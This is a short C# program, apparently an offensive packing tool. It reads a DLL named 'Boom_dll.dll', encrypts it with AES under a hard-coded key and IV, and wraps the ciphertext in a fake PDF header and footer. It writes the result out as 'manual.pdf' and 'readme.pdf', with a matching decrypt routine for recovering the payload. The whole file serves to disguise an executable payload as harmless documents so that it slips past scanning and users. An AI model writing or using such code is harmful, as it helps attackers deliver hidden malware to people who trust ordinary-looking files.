using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.IO;

namespace CreateEncryptedPDF
{
    class Program
    {
		private static byte[] IV = Encoding.UTF8.GetBytes("1233t04p7jn3n4rg");
		private static byte[] Key = Encoding.UTF8.GetBytes("123do3y4r378o5t34onf7t3o573tfo73");
		private static byte[] pdfheader = new byte[] { 0x25,0x50,0x44,0x46,0x2D,0x31,0x2E,0x33,0x0A,0x25};
		private static byte[] pdffooter = new byte[] { 0x0A,0x25,0x25,0x45,0x4F,0x46,0x0A};

		static void Main(string[] args)
        {
			string filename = "..\\..\\Boom_dll.dll";
			byte[] file_data = File.ReadAllBytes(filename);

			byte[] result = Program.aes_crypt_write(file_data, Program.IV, Program.Key);
			byte[] final_result = new byte[result.Length + Program.pdfheader.Length + Program.pdffooter.Length];// = Program.pdfheader + result + Program.pdffooter;
			Buffer.BlockCopy(Program.pdfheader, 0, final_result, 0, Program.pdfheader.Length);
			Buffer.BlockCopy(result, 0, final_result, Program.pdfheader.Length, result.Length);
			Buffer.BlockCopy(Program.pdffooter, 0, final_result, Program.pdfheader.Length + result.Length, Program.pdffooter.Length);
			File.WriteAllBytes("..\\..\\manual.pdf", final_result);
			File.WriteAllBytes("..\\..\\readme.pdf", final_result);
		}

		public static byte[] aes_crypt_read(byte[] SourceData, byte[] IV, byte[] Key)
		{
			Aes aes = Aes.Create();
			aes.Key = Key;
			aes.IV = IV;
			aes.Mode = CipherMode.CBC;
			ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream(SourceData))
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
				{
					byte[] array = new byte[SourceData.Length];
					cryptoStream.Read(array, 0, SourceData.Length);
					result = array;
				}
			}
			return result;
		}

		public static byte[] aes_crypt_write(byte[] SourceData, byte[] IV, byte[] Key)
		{
			Aes aes = Aes.Create();
			aes.Key = Key;
			aes.IV = IV;
			aes.Mode = CipherMode.CBC;
			ICryptoTransform transform = aes.CreateEncryptor(aes.Key, aes.IV);
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
				{
					cryptoStream.Write(SourceData, 0, SourceData.Length);
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}
}
